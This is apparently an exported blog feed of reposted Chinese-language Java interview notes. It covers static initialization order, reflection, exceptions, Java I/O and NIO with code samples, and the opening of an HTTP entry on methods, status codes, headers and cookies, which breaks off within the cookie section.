静态内部类不能访问外部类的非静态的变量和方法。 5. 静态导包 1import static com.xxx.ClassName.* 在使用静态变量和方法时不用再指明 ClassName，从而简化代码，但可读性大大降低。 6. 初始化顺序 静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。 1public static String staticField = "静态变量"; 123static &#123; System.out.println("静态语句块");&#125; 1public String field = "实例变量"; 123&#123; System.out.println("普通语句块");&#125; 最后才是构造函数的初始化。 123public InitialOrderTest() &#123; System.out.println("构造函数");&#125; 存在继承的情况下，初始化顺序为： 父类（静态变量、静态语句块） 子类（静态变量、静态语句块） 父类（实例变量、普通语句块） 父类（构造函数） 子类（实例变量、普通语句块） 子类（构造函数） 七、反射每个类都有一个 Class 对象，包含了与类有关的信息。当编译一个新类时，会产生一个同名的 .class 文件，该文件内容保存着 Class 对象。 类加载相当于 Class 对象的加载。类在第一次使用时才动态加载到 JVM 中，可以使用 Class.forName(“com.mysql.jdbc.Driver”) 这种方式来控制类的加载，该方法会返回一个 Class 对象。 反射可以提供运行时的类信息，并且这个类可以在运行时才加载进来，甚至在编译时期该类的 .class 不存在也可以加载进来。 Class 和 java.lang.reflect 一起对反射提供了支持，java.lang.reflect 类库主要包含了以下三个类： Field ：可以使用 get() 和 set() 方法读取和修改 Field 对象关联的字段； Method ：可以使用 invoke() 方法调用与 Method 对象关联的方法； Constructor ：可以用 Constructor 创建新的对象。 Advantages of Using Reflection: Extensibility Features : An application may make use of external, user-defined classes by creating instances of extensibility objects using their fully-qualified names. Class Browsers and Visual Development Environments : A class browser needs to be able to enumerate the members of classes. Visual development environments can benefit from making use of type information available in reflection to aid the developer in writing correct code. Debuggers and Test Tools : Debuggers need to be able to examine private members on classes. Test harnesses can make use of reflection to systematically call a discoverable set APIs defined on a class, to insure a high level of code coverage in a test suite. Drawbacks of Reflection: Reflection is powerful, but should not be used indiscriminately. If it is possible to perform an operation without using reflection, then it is preferable to avoid using it. The following concerns should be kept in mind when accessing code via reflection. Performance Overhead : Because reflection involves types that are dynamically resolved, certain Java virtual machine optimizations can not be performed. Consequently, reflective operations have slower performance than their non-reflective counterparts, and should be avoided in sections of code which are called frequently in performance-sensitive applications. Security Restrictions : Reflection requires a runtime permission which may not be present when running under a security manager. This is in an important consideration for code which has to run in a restricted security context, such as in an Applet. Exposure of Internals :Since reflection allows code to perform operations that would be illegal in non-reflective code, such as accessing private fields and methods, the use of reflection can result in unexpected side-effects, which may render code dysfunctional and may destroy portability. Reflective code breaks abstractions and therefore may change behavior with upgrades of the platform. Trail: The Reflection API 深入解析 Java 反射（1）- 基础 八、异常Throwable 可以用来表示任何可以作为异常抛出的类，分为两种： Error 和 Exception。其中 Error 用来表示 JVM 无法处理的错误，Exception 分为两种： 受检异常 ：需要用 try…catch… 语句捕获并进行处理，并且可以从异常中恢复； 非受检异常 ：是程序运行时错误，例如除 0 会引发 Arithmetic Exception，此时程序奔溃并且无法恢复。 Java 入门之异常处理 Java 异常的面试问题及答案 -Part 1 九、泛型123456public class Box&lt;T&gt; &#123; // T stands for "Type" private T t; public void set(T t) &#123; this.t = t; &#125; public T get() &#123; return t; &#125;&#125; Java 泛型详解 10 道 Java 泛型面试题 十、注解Java 注解是附加在代码中的一些元信息，用于一些工具在编译、运行时进行解析和使用，起到说明、配置的功能。注解不会也不能影响代码的实际逻辑，仅仅起到辅助性的作用。 注解 Annotation 实现原理与自定义注解例子 十一、特性Java 各版本的新特性New highlights in Java SE 8 Lambda Expressions Pipelines and Streams Date and Time API Default Methods Type Annotations Nashhorn JavaScript Engine Concurrent Accumulators Parallel operations PermGen Error Removed New highlights in Java SE 7 Strings in Switch Statement Type Inference for Generic Instance Creation Multiple Exception Handling Support for Dynamic Languages Try with Resources Java nio Package Binary Literals, Underscore in literals Diamond Syntax Difference between Java 1.8 and Java 1.7? Java 8 特性 Java 与 C++ 的区别 Java 是纯粹的面向对象语言，所有的对象都继承自 java.lang.Object，C++ 为了兼容 C 即支持面向对象也支持面向过程。 Java 通过虚拟机从而实现跨平台特性，但是 C++ 依赖于特定的平台。 Java 没有指针，它的引用可以理解为安全指针，而 C++ 具有和 C 一样的指针。 Java 支持自动垃圾回收，而 C++ 需要手动回收。 Java 不支持多重继承，只能通过实现多个接口来达到相同目的，而 C++ 支持多重继承。 Java 不支持操作符重载，虽然可以对两个 String 对象支持加法运算，但是这是语言内置支持的操作，不属于操作符重载，而 C++ 可以。 Java 内置了线程的支持，而 C++ 需要依靠第三方库。 Java 的 goto 是保留字，但是不可用，C++ 可以使用 goto。 Java 不支持条件编译，C++ 通过 #ifdef #ifndef 等预处理命令从而实现条件编译。 What are the main differences between Java and C++? JRE or JDK JRE is the JVM program, Java application need to run on JRE. JDK is a superset of JRE, JRE + tools for developing java programs. e.g, it provides the compiler “javac” 参考资料 Eckel B. Java 编程思想[M]. 机械工业出版社, 2002. Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java IO]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FJava%20IO%2F</url>
    <content type="text"><![CDATA[一、概览 二、磁盘操作 三、字节操作 四、字符操作 五、对象操作 六、网络操作 InetAddress URL Sockets Datagram 七、NIO 流与块 通道与缓冲区 缓冲区状态变量 文件 NIO 实例 选择器 套接字 NIO 实例 内存映射文件 对比 八、参考资料 一、概览Java 的 I/O 大概可以分成以下几类： 磁盘操作：File 字节操作：InputStream 和 OutputStream 字符操作：Reader 和 Writer 对象操作：Serializable 网络操作：Socket 新的输入/输出：NIO 二、磁盘操作File 类可以用于表示文件和目录的信息，但是它不表示文件的内容。 递归地输出一个目录下所有文件： 12345678910111213public static void listAllFiles(File dir)&#123; if (dir == null || !dir.exists()) &#123; return; &#125; if (dir.isFile()) &#123; System.out.println(dir.getName()); return; &#125; for (File file : Objects.requireNonNull(dir.listFiles())) &#123; listAllFiles(file); &#125;&#125; 三、字节操作使用字节流操作进行文件复制： 12345678910111213public static void copyFile(String src, String dist) throws IOException&#123; FileInputStream in = new FileInputStream(src); FileOutputStream out = new FileOutputStream(dist); byte[] buffer = new byte[20 * 1024]; /* read() 最多读取 buffer.length 个字节 返回的是实际读取的个数，返回 -1 的时候表示读到 eof，即文件尾 */ while (in.read(buffer, 0, buffer.length) != -1) &#123; out.write(buffer); &#125; in.close(); out.close();&#125; Java I/O 使用了装饰者模式来实现。以 InputStream 为例，InputStream 是抽象组件，FileInputStream 是 InputStream 的子类，属于具体组件，提供了字节流的输入操作。FilterInputStream 属于抽象装饰者，装饰者用于装饰组件，为组件提供额外的功能，例如 BufferedInputStream 为 FileInputStream 提供缓存的功能。 实例化一个具有缓存功能的字节流对象时，只需要在 FileInputStream 对象上再套一层 BufferedInputStream 对象即可。 12FileInputStream fileInputStream = new FileInputStream("file/1.txt");BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream); DataInputStream 装饰者提供了对更多数据类型进行输入的操作，比如 int、double 等基本类型。 四、字符操作不管是磁盘还是网络传输，最小的存储单元都是字节，而不是字符。但是在程序中操作的通常是字符形式的数据，因此需要提供对字符进行操作的方法。 InputStreamReader 实现从文本文件的字节流解码成字符流； OutputStreamWriter 实现字符流编码成为文本文件的字节流。 逐行输出文本文件的内容： 12345678910FileReader fileReader = new FileReader("file/1.txt");BufferedReader bufferedReader = new BufferedReader(fileReader);String line;while ((line = bufferedReader.readLine()) != null) &#123; System.out.println(line);&#125;/* 装饰者模式使得 BufferedReader 组合了一个 Reader 对象 在调用 BufferedReader 的 close() 方法时会去调用 fileReader 的 close() 方法 因此只要一个 close() 调用即可 */bufferedReader.close(); 编码就是把字符转换为字节，而解码是把字节重新组合成字符。 如果编码和解码过程使用不同的编码方式那么就出现了乱码。 GBK 编码中，中文字符占 2 个字节，英文字符占 1 个字节； UTF-8 编码中，中文字符占 3 个字节，英文字符占 1 个字节； UTF-16be 编码中，中文字符和英文字符都占 2 个字节。 UTF-16be 中的 be 指的是 Big Endian，也就是大端。相应地也有 UTF-16le，le 指的是 Little Endian，也就是小端。 Java 使用双字节编码 UTF-16be，这不是指 Java 只支持这一种编码方式，而是说 char 这种类型使用 UTF-16be 进行编码。char 类型占 16 位，也就是两个字节，Java 使用这种双字节编码是为了让一个中文或者一个英文都能使用一个 char 来存储。 String 可以看成一个字符序列，可以指定一个编码方式将它转换为字节序列，也可以指定一个编码方式将一个字节序列转换为 String。 1234String str1 = "中文";byte[] bytes = str1.getBytes("UTF-8");String str2 = new String(bytes, "UTF-8");System.out.println(str2); 在调用无参数 getBytes() 方法时，默认的编码方式不是 UTF-16be。双字节编码的好处是可以使用一个 char 存储中文和英文，而将 String 转为 bytes[] 字节数组就不再需要这个好处，因此也就不再需要双字节编码。getBytes() 的默认编码方式与平台有关，一般为 UTF-8。 1byte[] bytes = str1.getBytes(); 五、对象操作序列化就是将一个对象转换成字节序列，方便存储和传输。 序列化：ObjectOutputStream.writeObject() 反序列化：ObjectInputStream.readObject() 序列化的类需要实现 Serializable 接口，它只是一个标准，没有任何方法需要实现，但是如果不去实现它的话而进行序列化，会抛出异常。 12345678910111213141516171819202122232425262728293031public static void main(String[] args) throws IOException, ClassNotFoundException&#123; A a1 = new A(123, "abc"); String objectFile = "file/a1"; ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(objectFile)); objectOutputStream.writeObject(a1); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(objectFile)); A a2 = (A) objectInputStream.readObject(); objectInputStream.close(); System.out.println(a2);&#125;private static class A implements Serializable&#123; private int x; private String y; A(int x, String y) &#123; this.x = x; this.y = y; &#125; @Override public String toString() &#123; return "x = " + x + " " + "y = " + y; &#125;&#125; 不会对静态变量进行序列化，因为序列化只是保存对象的状态，静态变量属于类的状态。 transient 关键字可以使一些属性不会被序列化。 ArrayList 序列化和反序列化的实现 ：ArrayList 中存储数据的数组是用 transient 修饰的，因为这个数组是动态扩展的，并不是所有的空间都被使用，因此就不需要所有的内容都被序列化。通过重写序列化和反序列化方法，使得可以只序列化数组中有内容的那部分数据。 1private transient Object[] elementData; 六、网络操作Java 中的网络支持： InetAddress：用于表示网络上的硬件资源，即 IP 地址； URL：统一资源定位符； Sockets：使用 TCP 协议实现网络通信； Datagram：使用 UDP 协议实现网络通信。 InetAddress没有公有构造函数，只能通过静态方法来创建实例。 12InetAddress.getByName(String host);InetAddress.getByAddress(byte[] address); URL可以直接从 URL 中读取字节流数据。 12345678910111213public static void main(String[] args) throws IOException&#123; URL url = new URL("http://www.baidu.com"); InputStream is = url.openStream(); /* 字节流 */ InputStreamReader isr = new InputStreamReader(is, "utf-8"); /* 字符流 */ BufferedReader br = new BufferedReader(isr); String line = br.readLine(); while (line != null) &#123; System.out.println(line); line = br.readLine(); &#125; br.close();&#125; Sockets ServerSocket：服务器端类 Socket：客户端类 服务器和客户端通过 InputStream 和 OutputStream 进行输入输出。 Datagram DatagramPacket：数据包类 DatagramSocket：通信类 七、NIO Java NIO Tutorial Java NIO 浅析 IBM: NIO 入门 新的输入/输出 (NIO) 库是在 JDK 1.4 中引入的。NIO 弥补了原来的 I/O 的不足，提供了高速的、面向块的 I/O。 流与块I/O 与 NIO 最重要的区别是数据打包和传输的方式，I/O 以流的方式处理数据，而 NIO 以块的方式处理数据。 面向流的 I/O 一次处理一个字节数据，一个输入流产生一个字节数据，一个输出流消费一个字节数据。为流式数据创建过滤器非常容易，链接几个过滤器，以便每个过滤器只负责复杂处理机制的一部分。不利的一面是，面向流的 I/O 通常相当慢。 面向块的 I/O 一次处理一个数据块，按块处理数据比按流处理数据要快得多。但是面向块的 I/O 缺少一些面向流的 I/O 所具有的优雅性和简单性。 I/O 包和 NIO 已经很好地集成了，java.io.* 已经以 NIO 为基础重新实现了，所以现在它可以利用 NIO 的一些特性。例如，java.io.* 包中的一些类包含以块的形式读写数据的方法，这使得即使在面向流的系统中，处理速度也会更快。 通道与缓冲区1. 通道通道 Channel 是对原 I/O 包中的流的模拟，可以通过它读取和写入数据。 通道与流的不同之处在于，流只能在一个方向上移动，(一个流必须是 InputStream 或者 OutputStream 的子类)，而通道是双向的，可以用于读、写或者同时用于读写。 通道包括以下类型： FileChannel：从文件中读写数据； DatagramChannel：通过 UDP 读写网络中数据； SocketChannel：通过 TCP 读写网络中数据； ServerSocketChannel：可以监听新进来的 TCP 连接，对每一个新进来的连接都会创建一个 SocketChannel。 2. 缓冲区发送给一个通道的所有数据都必须首先放到缓冲区中，同样地，从通道中读取的任何数据都要先读到缓冲区中。也就是说，不会直接对通道进行读写数据，而是要先经过缓冲区。 缓冲区实质上是一个数组，但它不仅仅是一个数组。缓冲区提供了对数据的结构化访问，而且还可以跟踪系统的读/写进程。 缓冲区包括以下类型： ByteBuffer CharBuffer ShortBuffer IntBuffer LongBuffer FloatBuffer DoubleBuffer 缓冲区状态变量 capacity：最大容量； position：当前已经读写的字节数； limit：还可以读写的字节数。 状态变量的改变过程举例： ① 新建一个大小为 8 个字节的缓冲区，此时 position 为 0，而 limit = capacity = 8。capacity 变量不会改变，下面的讨论会忽略它。 ② 从输入通道中读取 5 个字节数据写入缓冲区中，此时 position 移动设置为 5，limit 保持不变。 ③ 在将缓冲区的数据写到输出通道之前，需要先调用 flip() 方法，这个方法将 limit 设置为当前 position，并将 position 设置为 0。 ④ 从缓冲区中取 4 个字节到输出缓冲中，此时 position 设为 4。 ⑤ 最后需要调用 clear() 方法来清空缓冲区，此时 position 和 limit 都被设置为最初位置。 文件 NIO 实例以下展示了使用 NIO 快速复制文件的实例： 1234567891011121314151617public static void fastCopy(String src, String dist) throws IOException&#123; FileInputStream fin = new FileInputStream(src); /* 获得源文件的输入字节流 */ FileChannel fcin = fin.getChannel(); /* 获取输入字节流的文件通道 */ FileOutputStream fout = new FileOutputStream(dist); /* 获取目标文件的输出字节流 */ FileChannel fcout = fout.getChannel(); /* 获取输出字节流的通道 */ ByteBuffer buffer = ByteBuffer.allocateDirect(1024); /* 为缓冲区分配 1024 个字节 */ while (true) &#123; int r = fcin.read(buffer); /* 从输入通道中读取数据到缓冲区中 */ if (r == -1) &#123; /* read() 返回 -1 表示 EOF */ break; &#125; buffer.flip(); /* 切换读写 */ fcout.write(buffer); /* 把缓冲区的内容写入输出文件中 */ buffer.clear(); /* 清空缓冲区 */ &#125;&#125; 选择器一个线程 Thread 使用一个选择器 Selector 通过轮询的方式去监听多个通道 Channel 上的事件，从而让一个线程就可以处理多个事件。 因为创建和切换线程的开销很大，因此使用一个线程来处理多个事件而不是一个线程处理一个事件具有更好的性能。 1. 创建选择器1Selector selector = Selector.open(); 2. 将通道注册到选择器上123ServerSocketChannel ssChannel = ServerSocketChannel.open();ssChannel.configureBlocking(false);ssChannel.register(selector, SelectionKey.OP_ACCEPT); 通道必须配置为非阻塞模式，否则使用选择器就没有任何意义了，因为如果通道在某个事件上被阻塞，那么服务器就不能响应其它事件，必须等待这个事件处理完毕才能去处理其它事件，显然这和选择器的作用背道而驰。 在将通道注册到选择器上时，还需要指定要注册的具体事件，主要有以下几类： SelectionKey.OP_CONNECT SelectionKey.OP_ACCEPT SelectionKey.OP_READ SelectionKey.OP_WRITE 它们在 SelectionKey 的定义如下： 1234public static final int OP_READ = 1 &lt;&lt; 0;public static final int OP_WRITE = 1 &lt;&lt; 2;public static final int OP_CONNECT = 1 &lt;&lt; 3;public static final int OP_ACCEPT = 1 &lt;&lt; 4; 可以看出每个事件可以被当成一个位域，从而组成事件集整数。例如： 1int interestSet = SelectionKey.OP_READ | SelectionKey.OP_WRITE; 3. 监听事件1int num = selector.select(); 使用 select() 来监听事件到达，它会一直阻塞直到有至少一个事件到达。 4. 获取到达的事件1234567891011Set&lt;SelectionKey&gt; keys = selector.selectedKeys();Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator();while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; // ... &#125; else if (key.isReadable()) &#123; // ... &#125; keyIterator.remove();&#125; 5. 事件循环因为一次 select() 调用不能处理完所有的事件，并且服务器端有可能需要一直监听事件，因此服务器端处理事件的代码一般会放在一个死循环内。 1234567891011121314while (true) &#123; int num = selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; // ... &#125; else if (key.isReadable()) &#123; // ... &#125; keyIterator.remove(); &#125;&#125; 套接字 NIO 实例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class NIOServer&#123; public static void main(String[] args) throws IOException &#123; Selector selector = Selector.open(); ServerSocketChannel ssChannel = ServerSocketChannel.open(); ssChannel.configureBlocking(false); ssChannel.register(selector, SelectionKey.OP_ACCEPT); ServerSocket serverSocket = ssChannel.socket(); InetSocketAddress address = new InetSocketAddress("127.0.0.1", 8888); serverSocket.bind(address); while (true) &#123; selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; ServerSocketChannel ssChannel1 = (ServerSocketChannel) key.channel(); // 服务器会为每个新连接创建一个 SocketChannel SocketChannel sChannel = ssChannel1.accept(); sChannel.configureBlocking(false); // 这个新连接主要用于从客户端读取数据 sChannel.register(selector, SelectionKey.OP_READ); &#125; else if (key.isReadable()) &#123; SocketChannel sChannel = (SocketChannel) key.channel(); System.out.println(readDataFromSocketChannel(sChannel)); sChannel.close(); &#125; keyIterator.remove(); &#125; &#125; &#125; private static String readDataFromSocketChannel(SocketChannel sChannel) throws IOException &#123; ByteBuffer buffer = ByteBuffer.allocate(1024); StringBuilder data = new StringBuilder(); while (true) &#123; buffer.clear(); int n = sChannel.read(buffer); if (n == -1) &#123; break; &#125; buffer.flip(); int limit = buffer.limit(); char[] dst = new char[limit]; for (int i = 0; i &lt; limit; i++) &#123; dst[i] = (char) buffer.get(i); &#125; data.append(dst); buffer.clear(); &#125; return data.toString(); &#125;&#125; 1234567891011public class NIOClient&#123; public static void main(String[] args) throws IOException &#123; Socket socket = new Socket("127.0.0.1", 8888); OutputStream out = socket.getOutputStream(); String s = "hello world"; out.write(s.getBytes()); out.close(); &#125;&#125; 内存映射文件内存映射文件 I/O 是一种读和写文件数据的方法，它可以比常规的基于流或者基于通道的 I/O 快得多。 只有文件中实际读取或者写入的部分才会映射到内存中。 现代操作系统一般会根据需要将文件的部分映射为内存的部分，从而实现文件系统。Java 内存映射机制只不过是在底层操作系统中可以采用这种机制时，提供了对该机制的访问。 向内存映射文件写入可能是危险的，仅只是改变数组的单个元素这样的简单操作，就可能会直接修改磁盘上的文件。修改数据与将数据保存到磁盘是没有分开的。 下面代码行将文件的前 1024 个字节映射到内存中，map() 方法返回一个 MappedByteBuffer，它是 ByteBuffer 的子类。因此，您可以像使用其他任何 ByteBuffer 一样使用新映射的缓冲区，操作系统会在需要时负责执行映射。 1MappedByteBuffer mbb = fc.map(FileChannel.MapMode.READ_WRITE, 0, 1024); 对比NIO 与普通 I/O 的区别主要有以下两点： NIO 是非阻塞的。应当注意，FileChannel 不能切换到非阻塞模式，套接字 Channel 可以。 NIO 面向块，I/O 面向流。 八、参考资料 Eckel B, 埃克尔, 昊鹏, 等. Java 编程思想 [M]. 机械工业出版社, 2002. IBM: NIO 入门 IBM: 深入分析 Java I/O 的工作机制 IBM: 深入分析 Java 中的中文编码问题 IBM: Java 序列化的高级认识 NIO 与传统 IO 的区别 Decorator Design Pattern Socket Multicast]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FHTTP%2F</url>
    <content type="text"><![CDATA[一 、基础概念 URL 请求和响应报文 二、HTTP 方法 GET HEAD POST PUT PATCH DELETE OPTIONS CONNECT TRACE 三、HTTP 状态码 1XX 信息 2XX 成功 3XX 重定向 4XX 客户端错误 5XX 服务器错误 四、HTTP 首部 通用首部字段 请求首部字段 响应首部字段 实体首部字段 五、具体应用 Cookie 缓存 连接管理 内容协商 内容编码 范围请求 分块传输编码 多部分对象集合 虚拟主机 通信数据转发 六、HTTPs 加密 认证 完整性保护 HTTPs 的缺点 配置 HTTPs 七、Web 攻击技术 跨站脚本攻击 跨站请求伪造 SQL 注入攻击 拒绝服务攻击 八、GET 和 POST 的区别 作用 参数 安全 幂等性 可缓存 XMLHttpRequest 九、HTTP/1.0 与 HTTP/1.1 的区别 十、HTTP/2.0 HTTP/1.x 缺陷 二进制分帧层 服务端推送 首部压缩 参考资料 一 、基础概念URL URI（Uniform Resource Indentifier，统一资源标识符） URL（Uniform Resource Locator，统一资源定位符） URN（Uniform Resource Name，统一资源名称），例如 urn:isbn:0-486-27557-4。 URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。 请求和响应报文1. 请求报文 2. 响应报文 二、HTTP 方法客户端发送的 请求报文 第一行为请求行，包含了方法字段。 GET 获取资源 当前网络请求中，绝大部分使用的是 GET 方法。 HEAD 获取报文首部 和 GET 方法一样，但是不返回报文实体主体部分。 主要用于确认 URL 的有效性以及资源更新的日期时间等。 POST 传输实体主体 POST 主要用来传输数据，而 GET 主要用来获取资源。 更多 POST 与 GET 的比较请见第八章。 PUT 上传文件 由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。 123456PUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt; PATCH 对资源进行部分修改 PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。 1234567PATCH /file.txt HTTP/1.1Host: www.example.comContent-Type: application/exampleIf-Match: "e0023aa4e"Content-Length: 100[description of changes] DELETE 删除文件 与 PUT 功能相反，并且同样不带验证机制。 1DELETE /file.html HTTP/1.1 OPTIONS 查询支持的方法 查询指定的 URL 能够支持的方法。 会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。 CONNECT 要求在与代理服务器通信时建立隧道 使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。 1CONNECT www.example.com:443 HTTP/1.1 TRACE 追踪路径 服务器会将通信路径返回给客户端。 发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。 通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪）。 三、HTTP 状态码服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。 状态码 类别 原因短语 1XX Informational（信息性状态码） 接收的请求正在处理 2XX Success（成功状态码） 请求正常处理完毕 3XX Redirection（重定向状态码） 需要进行附加操作以完成请求 4XX Client Error（客户端错误状态码） 服务器无法处理请求 5XX Server Error（服务器错误状态码） 服务器处理请求出错 1XX 信息 100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。 2XX 成功 200 OK 204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。 206 Partial Content ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。 3XX 重定向 301 Moved Permanently ：永久性重定向 302 Found ：临时性重定向 303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。 304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。 307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。 4XX 客户端错误 400 Bad Request ：请求报文中存在语法错误。 401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。 403 Forbidden ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。 404 Not Found 5XX 服务器错误 500 Internal Server Error ：服务器正在执行请求时发生错误。 503 Service Unavilable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。 四、HTTP 首部有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。 各种首部字段及其含义如下（不需要全记，仅供查阅）： 通用首部字段 首部字段名 说明 Cache-Control 控制缓存的行为 Connection 控制不再转发给代理的首部字段、管理持久连接 Date 创建报文的日期时间 Pragma 报文指令 Trailer 报文末端的首部一览 Transfer-Encoding 指定报文主体的传输编码方式 Upgrade 升级为其他协议 Via 代理服务器的相关信息 Warning 错误通知 请求首部字段 首部字段名 说明 Accept 用户代理可处理的媒体类型 Accept-Charset 优先的字符集 Accept-Encoding 优先的内容编码 Accept-Language 优先的语言（自然语言） Authorization Web 认证信息 Expect 期待服务器的特定行为 From 用户的电子邮箱地址 Host 请求资源所在服务器 If-Match 比较实体标记（ETag） If-Modified-Since 比较资源的更新时间 If-None-Match 比较实体标记（与 If-Match 相反） If-Range 资源未更新时发送实体 Byte 的范围请求 If-Unmodified-Since 比较资源的更新时间（与 If-Modified-Since 相反） Max-Forwards 最大传输逐跳数 Proxy-Authorization 代理服务器要求客户端的认证信息 Range 实体的字节范围请求 Referer 对请求中 URI 的原始获取方 TE 传输编码的优先级 User-Agent HTTP 客户端程序的信息 响应首部字段 首部字段名 说明 Accept-Ranges 是否接受字节范围请求 Age 推算资源创建经过时间 ETag 资源的匹配信息 Location 令客户端重定向至指定 URI Proxy-Authenticate 代理服务器对客户端的认证信息 Retry-After 对再次发起请求的时机要求 Server HTTP 服务器的安装信息 Vary 代理服务器缓存的管理信息 WWW-Authenticate 服务器对客户端的认证信息 实体首部字段 首部字段名 说明 Allow 资源可支持的 HTTP 方法 Content-Encoding 实体主体适用的编码方式 Content-Language 实体主体的自然语言 Content-Length 实体主体的大小 Content-Location 替代对应资源的 URI Content-MD5 实体主体的报文摘要 Content-Range 实体主体的位置范围 Content-Type 实体主体的媒体类型 Expires 实体主体过期的日期时间 Last-Modified 资源的最后修改日期时间 五、具体应用CookieHTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。 Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。它用于告知服务端两个请求是否来自同一浏览器，并保持用户的登录状态。 1. 用途 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等） Cookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB。 2. 创建过程服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。 123456HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content] 客户端之后对同一个服务器发送请求时，会从浏览器中读出 Cookie 信息通过 Cookie 请求首部字段发送给服务器。 123GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry 3. 分类 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 4. JavaScript 获取 Cookie通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。 123document.cookie = "yummy_cookie=choco";document.cookie = "tasty_cookie=strawberry";console.log(document.cookie); 5. Secure 和 HttpOnly标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。 标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。因为跨域脚本 (XSS) 攻击常常使用 JavaScript 的 Document.cookie API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly 6. 作用域Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。 Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (“/“) 作为路径分隔符，子路径也会被匹配。例如，设置 